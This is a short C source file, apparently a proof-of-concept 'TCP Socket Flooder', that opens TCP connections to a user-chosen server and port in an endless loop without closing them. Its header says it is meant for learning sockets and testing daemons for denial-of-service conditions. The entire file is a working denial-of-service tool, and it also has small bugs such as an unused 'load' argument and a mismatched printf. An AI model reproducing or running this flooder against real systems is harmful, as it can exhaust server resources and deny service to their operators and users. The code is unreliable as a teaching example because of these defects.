/* TCP Socket Flooder 
Written as simple PoC, to learn Socket-C and test various stuff against DoS. 

What what is different with this code compared to others?
The ability to dynamicly change ports.

1.0 First release. Basic PoC code.

1.1 Added Port support.
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>


int main (int argc, char *argv[]) {

  int sd, rc, i;
  struct sockaddr_in localAddr, servAddr;
  struct hostent *h;
  
  if(argc != 4) {
    /* Print info */
    printf("\nTCP Smuggler by Jonas\n");
    printf("Socketflooder to test various serverdemons for DoS-conditions.\n");
    printf("usage: ./tcp_socket_smuggler \"server IP/FQDN\" port load\n\n");
    exit(1);
  }

  h = gethostbyname(argv[1]);

  servAddr.sin_family = h->h_addrtype;
  memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
  servAddr.sin_port = htons(atoi(argv[2]));

/* Let's Start the Game */
for(i=0;0<1;i++) { 

printf("Open Socket: %d\n",i);

  /* create socket */
  sd = socket(AF_INET, SOCK_STREAM, 0);
  if(sd<0) {
    perror("cannot open socket ");
    exit(1);
  }

  /* bind any port number */
  localAddr.sin_family = AF_INET;
  localAddr.sin_addr.s_addr = htonl(INADDR_ANY);
  localAddr.sin_port = htons(0);
  
  rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));
  if(rc<0) {
    printf("%s: cannot bind port TCP %u\n",argv[0]);
    perror("error ");
    exit(1);
  }
				
  /* connect to server */
  rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
  if(rc<0) {
    perror("cannot connect ");
    exit(1);
  }

			}



return 0;
  
}

